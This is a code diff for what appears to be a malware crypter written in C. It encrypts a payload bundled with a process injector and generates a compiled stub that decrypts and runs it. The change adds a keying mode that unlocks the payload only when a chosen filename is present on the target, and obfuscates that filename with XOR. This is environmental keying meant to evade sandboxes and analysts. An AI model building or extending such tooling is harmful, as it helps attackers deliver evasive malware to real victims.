@@ -110,7 +110,7 @@ void generateInjector(const char *injector_type_bin, const char *injector_type_p
 
     // why
     size_t size = mbstowcs(NULL, tProc, 0);
-    if (size == (size_t)-1) return 1;
+    if (size == (size_t)-1) return;
     wchar_t* wstr = malloc((size + 1) * sizeof(wchar_t));
     wchar_t* wstr_orig = wstr;
     mbstowcs(wstr, tProc, size + 1);
@@ -184,7 +184,7 @@ unsigned char *encrypt_payload(
     memcpy(composite + 8, injector, injector_len);
 	memcpy(composite + 8 + injector_len, payload, payload_len);
 
-    printf("[*] Key:");
+    printf("[*] Payload Key: ");
     for (int i = 0; i < SHA256_DIGEST_LENGTH; i++)
 		printf("%02x", key[i]);
     printf("\n");
@@ -204,7 +204,9 @@ unsigned char *encrypt_payload(
 void generate_stub(
     unsigned char *blob,
     int blob_len,
-    char *env_keytype)
+    char *env_keytype,
+    char *filename,
+    size_t flen)
 {
     FILE *f = fopen("stub.c", "w");
     if (!f) return;
@@ -229,7 +231,17 @@ void generate_stub(
     fprintf(f, "};\n");
     fprintf(f, "    unsigned int payload_len = %d;\n", blob_len);
     fprintf(f, "    unsigned char key[32];\n");
-    fprintf(f, "    if (!getKey(key)) return 1;\n");
+
+    if (strstr(env_keytype, "filename")) {
+		fprintf(f, "    char fkey[] = {");
+		for (int i = 0; i < flen; i++)
+			fprintf(f, " 0x%02x,", (unsigned char)filename[i]);
+		fprintf(f, " 0x00 };\n");
+        fprintf(f, "    unsigned int fLen = %d;\n", flen);
+		fprintf(f, "    if (!getFileExists(key, fkey, fLen)) return 1;\n");
+    }else fprintf(f, "    if (!getKey(key)) return 1;\n");
+
+    
     fprintf(f, "    int pt_len = 0;\n");
     fprintf(f, "    unsigned char *pt = decrypt(key, payload, payload_len, &pt_len);\n");
     fprintf(f, "    if (!pt) return 1;\n");
@@ -278,14 +290,30 @@ int main(int argc, char *argv[])
     
     generateInjector(injector_type_bin_buf, injector_type_proto_buf, tProc);
     
-
+    
 
     unsigned char key[SHA256_DIGEST_LENGTH];
 
-    SHA256((unsigned char*)env_value,
-           strlen(env_value),
-           key);
+    SHA256((unsigned char*)env_value, strlen(env_value), key);
 
+    char xorkey[256];
+    char fname[256];
+    size_t len = strlen(env_value);
+    
+    if (strcmp(env_keytype, "filename") == 0) {
+        print("WARNING: Reversing this keytype is trivial, if you care about that, use in conjunction with other types, or not at all.");
+        // Generate and create the xor key and filename bytes that will be passed to the stub.
+        for (int i = 0; i < sizeof(fname); i++)
+            xorkey[i] = 'a' + i;
+        for (size_t i = 0; i < len && i < sizeof(fname); i++)
+            fname[i] = env_value[i] ^ xorkey[i];
+        fname[len] = '\0';
+
+        printf("[*] Filename XOR Key: ");
+        for (int i = 0; i < len; i++)
+            printf("%02x", (unsigned char)fname[i]);
+		printf("\n");
+    }
 
 
     int blob_len;
@@ -297,7 +325,7 @@ int main(int argc, char *argv[])
         return 1;
     }
 	print("Generating stub...");
-    generate_stub(blob, blob_len, env_keytype_buf);
+    generate_stub(blob, blob_len, env_keytype_buf, fname, len);
     free(blob);
     
 	print("Compiling stub...");
